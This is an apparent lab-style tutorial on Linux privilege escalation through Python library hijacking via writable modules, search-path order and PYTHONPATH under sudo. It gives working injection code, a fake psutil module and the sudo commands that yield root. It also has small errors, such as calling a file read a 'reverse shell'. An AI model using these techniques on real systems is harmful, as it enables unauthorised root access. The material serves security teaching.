---
title: "Targeting python for Local Privilege Escalation"
date: 2025-07-12
thumbnail: /images/python3122.png
tags:
  - python
  - python imports
  - PrivEsc
description: "There are many ways in which we can abuse a Python library to PrivEsc. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used to PrivEsc."
---

![Python library hijacking and import exploitation diagram](../images/python3122.png)

# \_\_OVERVIEW

Python has [the Python standard library](https://docs.python.org/3/library/), with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. There are many ways in which we can abuse a Python library to PrivEsc. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used to PrivEsc.

<!-- more -->

#### Importing Modules

```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

There are many ways in which we can abuse a Python library to PrivEsc. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

---

## Wrong Write Permissions

If a Python module has world-writable permissions, any user can modify it. When a privileged Python script (especially one with SUID/SGID permissions) imports that module, the attacker’s injected code inside the writable module will automatically execute with those elevated privileges. This creates a serious privilege-escalation risk because the module becomes a vector to run arbitrary commands as the higher-privileged user.

If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` bit set. This means that we can execute the script with elevated permissions.

![permissions](../images/Pasted%20image%2020250712203305.png)

Checking our sudo privileges reveals the same python script can be executed with elevated permissions by our current user:

```
$ sudo -l
Matching Defaults entries for vipa0z on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vipa0z may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/vipa0z/mem_status.py
```

Let's view the content of the script.

```python
$ cat mem_status.py
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

We can see in the second line that this script imports the module `psutil` and uses the method `virtual_memory()`. the default path for python modules is at `/usr/local/lib/python3.8/dist-packages/`.

When this package is imported, the code inside `__init__.py` file is executed first.
This means that if a script imports a package like psutil and your user account has write permissions over that package’s directory, you could modify the `def virtual_memory():` method to include arbitrary code.
When the script runs and imports that package, your code will execute automatically because Python executes the top-level code in the module during import.

start by looking for the method `virtual_memory` in the psutil directory:

```shell
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py: def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
```

confirm write permission:

```shell
$ls -l /usr/local/lib/python3.8/dist-packages/psutil/ |grep `rw`

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Insert reverse shell code to hijack the method before it loads:

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('cat /root/flag.txt')


    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.
```

now when we run the script with sudo, it will execute the reverse shell code and a shell will be opened as root:

```shell
sudo -u root /usr/bin/python3 /home/htb-student/mem_status.py
```

---

## Library Path Abuse

In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

uming all contain a file named `mymodule.py`.

```rust
example_project/
├── main.py                  # Your main script
├── mymodule.py              # [Priority #1] Local module (script directory)
├── custom_dir/              # [Priority #2 if added manually to sys.path]
│   └── mymodule.py
├── venv/                    # [Priority #3] Virtual environment site-packages
│   └── lib/
│       └── python3.x/
│           └── site-packages/
│               └── mymodule.py
└── system/
    └── python3.x/
        └── lib/
            └── mymodule.py  # [Lowest priority] Global standard library or installed packages

```

### Path Listing

```
$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
/usr/lib/python3/dist-packages/sys*
```

Notice how the `sys` module is located under one of the lower priority paths listed via the `PYTHONPATH` variable.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions.

Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

In order to exploit this We must have write permissions to one of the paths having a higher priority on the list.

let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

```shell
crytix@lpenix:~$ pip3 show psutil

Location: /usr/local/lib/python3.8/dist-packages

<SNIP>
```

we can see that `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.

```shell
$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in.
Now lets create our module that will get executed before the original and place it
under `/dist-packages`, we'll have to name it `psutil.py` so python recognizes the name

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

copy our fake module to dist-packages

```
cp psutil.py  /usr/local/lib/python3.8/dist-packages
```

test

```shell-session
$ sudo /usr/bin/python3 mem_status.py
or $ sudo -u root /usr/bin/python3 /home/htb-student/mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

As we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.

---

## PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

```
$ sudo -l

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User crytix may run the following commands on LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

```shell-session
crytix@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.
